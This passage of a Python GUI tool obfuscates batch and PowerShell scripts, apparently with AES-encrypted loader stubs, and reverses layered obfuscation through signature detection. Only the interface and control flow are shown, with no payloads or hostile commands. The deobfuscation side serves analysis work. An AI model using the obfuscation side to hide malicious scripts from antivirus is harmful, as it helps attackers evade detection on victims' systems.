                            border_width=1, border_color="#171717")
        card.pack(fill="x")

        self.path_row(card, mode, "INPUT", "input")
        self.path_row(card, mode, "OUTPUT", "output")

        opts = ctk.CTkFrame(card, fg_color="transparent")
        opts.pack(fill="x", padx=16, pady=(2, 14))
        if mode == "deob":
            ctk.CTkLabel(opts, text="chain depth", font=(self.mono_font, 10),
                         text_color=DIM).pack(side="left")
            sp = ctk.CTkOptionMenu(opts, values=["1", "2", "3", "4", "5"], width=66,
                                   height=28, fg_color="#171717", button_color="#222222",
                                   button_hover_color="#2c2c2c", text_color=FG,
                                   font=(self.mono_font, 11), dropdown_font=(self.mono_font, 11),
                                   corner_radius=7)
            sp.set("3")
            sp.pack(side="left", padx=(9, 0))
            store["depth"] = sp
        else:
            ctk.CTkLabel(opts, text="wrap: full loader stub", font=(self.mono_font, 10),
                         text_color=DIM).pack(side="left")

        bar = ctk.CTkFrame(right, fg_color="transparent")
        bar.pack(fill="x", pady=11)

        self.run_btn[mode] = ctk.CTkButton(
            bar, text="RUN", height=40, font=(self.ui_font, 13, "bold"),
            fg_color=ACC, hover_color=ACC, text_color="#0a0a0a",
            corner_radius=9, command=lambda md=mode: self.run(md))
        self.run_btn[mode].pack(side="left", fill="x", expand=True)
        self.bind_hover(self.run_btn[mode], ACC, "#dcff66")

        self.soft_button(bar, "OPEN OUTPUT", lambda md=mode: self.open_output(md),
                         width=132).pack(side="left", padx=(9, 0))
        self.soft_button(bar, "CLEAR", lambda md=mode: self.clear_log(md),
                         width=84).pack(side="left", padx=(9, 0))

        self.log_box[mode] = ctk.CTkTextbox(right, font=(self.mono_font, 11),
                                            fg_color="#060606", text_color="#c9c9c9",
                                            corner_radius=11, border_width=1,
                                            border_color="#171717", wrap="none")
        self.log_box[mode].pack(fill="both", expand=True)
        self.log_box[mode].configure(state="disabled")

    def make_row(self, parent, mode, key, index, label, accent=False):
        store = self.store(mode)
        row = ctk.CTkFrame(parent, fg_color=ROW, height=32, corner_radius=7)
        row.pack(fill="x", pady=2)
        row.pack_propagate(False)

        bar = ctk.CTkFrame(row, width=2, fg_color="transparent", corner_radius=1)
        bar.pack(side="left", fill="y")
        num = ctk.CTkLabel(row, text="%02d" % index, width=28, font=(self.mono_font, 10),
                           text_color=DIM2)
        num.pack(side="left", padx=(8, 0))
        txt = ctk.CTkLabel(row, text=label, font=(self.ui_font, 12),
                           text_color=ACC_DIM if accent else FG_SOFT, anchor="w")
        txt.pack(side="left", fill="x", expand=True, padx=(2, 10))

        info = {"row": row, "bar": bar, "num": num, "txt": txt,
                "key": key, "off": False, "accent": accent}
        store["rows"][key] = info

        def enter(_=None):
            if info["off"] or store["sel"] == key:
                return
            row.configure(cursor="hand2")
            self.paint_row(info, "hover")

        def leave(_=None):
            if info["off"] or store["sel"] == key:
                return
            self.paint_row(info, "idle")

        def click(_=None):
            if info["off"]:
                return
            self.select(mode, key)

        for t in [row] + self._descendants(row):
            t.bind("<Enter>", enter, add="+")
            t.bind("<Leave>", leave, add="+")
            t.bind("<Button-1>", click, add="+")
        return info

    def paint_row(self, info, state):
        if info["off"]:
            info["row"].configure(fg_color="#0d0d0d", cursor="arrow")
            info["bar"].configure(fg_color="transparent")
            info["num"].configure(text_color="#3a3a3a")
            info["txt"].configure(text_color="#4a4a4a")
            return
        if state == "sel":
            self.anim(info["row"], "fg_color", ROW_SEL)
            info["bar"].configure(fg_color=ACC)
            info["num"].configure(text_color=ACC)
            info["txt"].configure(text_color=ACC)
        elif state == "hover":
            self.anim(info["row"], "fg_color", ROW_HOVER)
            info["bar"].configure(fg_color=ACC_DIM)
            info["num"].configure(text_color=DIM)
            info["txt"].configure(text_color=FG)
        else:
            self.anim(info["row"], "fg_color", ROW)
            info["bar"].configure(fg_color="transparent")
            info["num"].configure(text_color=DIM2)
            info["txt"].configure(text_color=ACC_DIM if info["accent"] else FG_SOFT)

    def set_off(self, info, flag):
        info["off"] = flag
        self.paint_row(info, "idle")

    def select(self, mode, key):
        store = self.store(mode)
        store["sel"] = key
        store["var"].set(key)
        for k, info in store["rows"].items():
            self.paint_row(info, "sel" if k == key else "idle")
        self.describe(mode, key)

    def describe(self, mode, key):
        if key == "auto":
            self.desc[mode].configure(
                text="Signature scan, best match first, then repeat on the result up to "
                     "the chain depth. Stops when nothing matches.")
            return
        m = method_by_key(key)
        if m:
            self.desc[mode].configure(text=m["desc"])

    def path_row(self, parent, mode, caption, which):
        store = self.store(mode)
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=16, pady=(14 if which == "input" else 7, 0))
        ctk.CTkLabel(row, text=caption, font=(self.mono_font, 10, "bold"),
                     text_color=DIM, width=58, anchor="w").pack(side="left")
        entry = ctk.CTkEntry(row, height=30, font=(self.mono_font, 11), fg_color="#090909",
                             border_color="#202020", text_color=FG, corner_radius=7,
                             placeholder_text=("path to .bat / .ps1" if which == "input"
                                               else "output path"))
        entry.pack(side="left", fill="x", expand=True, padx=(0, 9))
        store[which] = entry
        self.soft_button(row, "BROWSE", lambda: self.browse(mode, which)).pack(side="left")
        if which == "input":
            self.soft_button(row, "ANALYZE", lambda: self.analyze(mode),
                             accent=True).pack(side="left", padx=(9, 0))

    def log(self, line, mode=None):
        mode = mode or self.mode
        if not getattr(self, "log_box", None):
            return
        box = self.log_box.get(mode) or self.log_box.get("obf")
        if box is None:
            return
        box.configure(state="normal")
        box.insert("end", line + "\n")
        box.see("end")
        box.configure(state="disabled")

    def clear_log(self, mode=None):
        mode = mode or self.mode
        box = self.log_box.get(mode)
        if box is None:
            return
        box.configure(state="normal")
        box.delete("1.0", "end")
        box.configure(state="disabled")

    def browse(self, mode, which):
        store = self.store(mode)
        if which == "input":
            path = filedialog.askopenfilename(
                title="select target",
                filetypes=[("batch / powershell", "*.bat *.cmd *.ps1"), ("all files", "*.*")])
            if path:
                store["input"].delete(0, "end")
                store["input"].insert(0, path)
                self.autofill_output(mode, path)
        else:
            path = filedialog.asksaveasfilename(title="output path")
            if path:
                store["output"].delete(0, "end")
                store["output"].insert(0, path)

    def autofill_output(self, mode, path):
        store = self.store(mode)
        root, ext = os.path.splitext(path)
        suffix = "_obf" if mode == "obf" else "_deob"
        store["output"].delete(0, "end")
        store["output"].insert(0, root + suffix + ext)

    def open_output(self, mode):
        store = self.store(mode)
        path = store["output"].get().strip()
        if path and os.path.exists(path):
            folder = os.path.dirname(os.path.abspath(path))
            try:
                if sys.platform.startswith("win"):
                    os.startfile(folder)
                else:
                    subprocess.Popen(["xdg-open", folder])
            except Exception as exc:
                self.log("[!] " + str(exc), mode)
        else:
            self.log("[!] output does not exist yet", mode)

    def analyze(self, mode):
        store = self.store(mode)
        path = store["input"].get().strip()
        if not path or not os.path.isfile(path):
            self.log("[!] pick an existing input file", mode)
            return
        try:
            size = os.path.getsize(path)
            if size > MAXBYTES:
                self.log("[!] file larger than %d MB" % (MAXBYTES // 1024 // 1024), mode)
                return
            with open(path, "rb") as fh:
                raw = fh.read()
            text = normalize_text(raw)
        except Exception as exc:
            self.log("[!] read failed: " + str(exc), mode)
            return

        ext = os.path.splitext(path)[1].lower()
        self.log("[i] %s  %d bytes  %d lines"
                 % (os.path.basename(path), size, text.count("\n") + 1), mode)

        hits = detect(text)
        if hits:
            self.log("[i] signatures:", mode)
            for score, key in hits:
                self.log("      %3d  %s" % (score, method_by_key(key)["label"]), mode)
        else:
            self.log("[i] no known signature", mode)

        if mode == "obf":
            usable = []
            for m in METHODS:
                ok = ext in m["targets"] and (aes_available() or not m.get("needs_aes"))
                self.set_off(store["rows"][m["key"]], not ok)
                if ok:
                    usable.append(m)
            self.log("[i] %d of %d methods support %s"
                     % (len(usable), len(METHODS), ext or "?"), mode)
            if usable:
                self.select("obf", usable[0]["key"])
        else:
            if hits:
                best = method_by_key(hits[0][1])
                self.select("deob", best["key"])
                self.log("[i] preselected: " + best["label"], mode)
            else:
                self.select("deob", "auto")

    def run(self, mode):
        if self.busy:
            return
        store = self.store(mode)
        src = store["input"].get().strip()
        dst = store["output"].get().strip()
        if not src or not os.path.isfile(src):
            self.log("[!] invalid input path", mode)
            return
        if not dst:
            self.autofill_output(mode, src)
            dst = store["output"].get().strip()
        key = store["sel"]
        if not key:
            self.log("[!] no method selected", mode)
            return
        depth = 1
        if mode == "deob":
            depth = int(store["depth"].get())
        self.busy = True
        self.state_dot.configure(text="●  working", text_color=WARN)
        self.run_btn[mode].configure(state="disabled", text="WORKING", fg_color=ACC_DIM)
        threading.Thread(target=self.worker, args=(mode, src, dst, key, depth),
                         daemon=True).start()

    def worker(self, mode, src, dst, key, depth):
        try:
            with open(src, "rb") as fh:
                text = normalize_text(fh.read())
            ext = os.path.splitext(src)[1].lower()

            if mode == "obf":
                m = method_by_key(key)
                if ext not in m["targets"]:
                    self.log("[!] %s does not support %s" % (m["label"], ext), mode)
                    return
                if m.get("needs_aes") and not aes_available():
                    self.log("[!] AES backend missing", mode)
                    return
                self.log("[i] applying %s" % m["label"], mode)
                result = m["obf"](text, ext)
                self.write(dst, result)
                self.log("[+] %d bytes -> %s" % (len(result), dst), mode)
                self.log("[+] done", mode)
            else:
                if key == "auto":
                    self.chain(text, dst, depth)
                else:
                    m = method_by_key(key)
                    self.log("[i] applying %s" % m["label"], mode)
                    result = self.step(text, m)
                    for _ in range(depth - 1):
                        hits = detect(result)
                        if not hits:
                            break
                        nxt = method_by_key(hits[0][1])
                        self.log("[i] layer: %s" % nxt["label"], mode)
                        result = self.step(result, nxt)
                    self.write(dst, result)
                    self.log("[+] %d bytes -> %s" % (len(result), dst), mode)
                    self.log("[+] done", mode)
        except DeobError as exc:
            self.log("[!] " + str(exc), mode)
        except Exception:
            self.log("[!] crash", mode)
            for line in traceback.format_exc().splitlines():
                self.log("    " + line, mode)
        finally:
            self.busy = False
            self.after(0, self.finish, mode)

    def step(self, text, m):
        out = m["deob"](text, ".bat")
        if not out or not out.strip():
            raise DeobError("empty result from " + m["label"])
        return out

    def chain(self, text, dst, depth):
        current = text
        applied = 0
        for _ in range(depth):
            hits = detect(current)
            if not hits:
                break
            m = method_by_key(hits[0][1])
            self.log("[i] layer %d: %s (%d)" % (applied + 1, m["label"], hits[0][0]), "deob")
            try:
                nxt = self.step(current, m)
            except DeobError as exc:
                self.log("[!] " + str(exc), "deob")
                break
            if nxt == current:
                break
            current = nxt
            applied += 1
        if not applied:
            self.log("[!] nothing could be reversed", "deob")
            return
        self.write(dst, current)
        self.log("[+] %d layer(s) removed, %d bytes -> %s" % (applied, len(current), dst), "deob")

    def write(self, dst, text):
        folder = os.path.dirname(os.path.abspath(dst))
        if folder and not os.path.isdir(folder):
            os.makedirs(folder, exist_ok=True)
        with open(dst, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(text)

    def finish(self, mode):
        self.state_dot.configure(text="●  idle", text_color=DIM2)
        self.run_btn[mode].configure(state="normal", text="RUN", fg_color=ACC)
        self._bgstate[(id(self.run_btn[mode]), "fg_color")] = ACC

def main():
    app = App()
    app.mainloop()

if __name__ == "__main__":
    main()